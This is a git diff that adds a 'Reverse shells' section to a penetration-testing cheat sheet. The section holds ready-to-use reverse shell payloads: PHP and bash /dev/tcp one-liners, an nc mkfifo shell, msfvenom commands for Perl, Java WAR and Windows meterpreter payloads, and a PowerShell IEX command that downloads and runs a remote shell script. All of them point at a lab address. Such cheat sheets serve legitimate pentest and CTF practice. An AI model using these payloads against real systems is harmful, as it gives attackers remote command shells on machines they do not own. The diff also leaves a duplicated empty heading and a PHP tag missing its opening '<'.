@@ -4,6 +4,7 @@
 * <a href="#useful-tools-on-kali)">[Useful tools (on Kali)](#useful-tools-on-kali)</a>
 * <a href="#ports-discovery-without-nmap">[Ports discovery without nmap](#ports-discovery-without-nmap)</a>
 * <a href="#web-directories-files-scanner">[Web directories/files scanner](#web-directories-files-scanner)</a>
+* <a href="#reverse-shells">[Reverse shells](#reverse-shells)</a>
 * <a href="#privilege-escalation">[Privilege escalation](#privilege-escalation)</a>
   * [Linux](#linux)
   * [Windows](#windows)
@@ -87,6 +88,49 @@ gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirbuster/director
 ```
 ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.56.101/FUZZ
 ```
+
+## Reverse shells[⤴](#table-of-contents)
+
+### PHP
+```
+?php $sock = fsockopen("192.168.56.101","443"); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>
+```
+```
+php -r '$sock=fsockopen("192.168.56.101",443);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+### Bash
+
+```
+bash -i >& /dev/tcp/192.168.56.101/443 0>&1
+```
+
+### Sh + nc
+
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.56.101 443 >/tmp/f
+```
+
+### Perl (example deploy as cgi-bin)
+```
+msfvenom -p cmd/unix/reverse_perl LHOST="192.168.56.101" LPORT=443 -f raw -o reverse_shell.cgi
+```
+
+### Java (example to deploy on tomcat)
+```
+msfvenom -p java/shell_reverse_tcp LHOST=192.168.56.101 LPORT=443 -f war  rev_shell.war
+```
+### Windows HTPP download reverse shell
+```
+msfvenom -a x86 --platform windows -p windows/exec CMD="powershell \"IEX(New-Object Net.WebClient).downloadString('http://192.168.56.101/Invoke-PowerShellTcp.ps1')\"" -e x86/unicode_mixed BufferRegister=EAX -f python
+```
+
+### Windows staged reverse TCP
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
+```
+
+### Windows staged reverse TCP
 
 ## Privilege Escalation[⤴](#table-of-contents)
 ### Linux
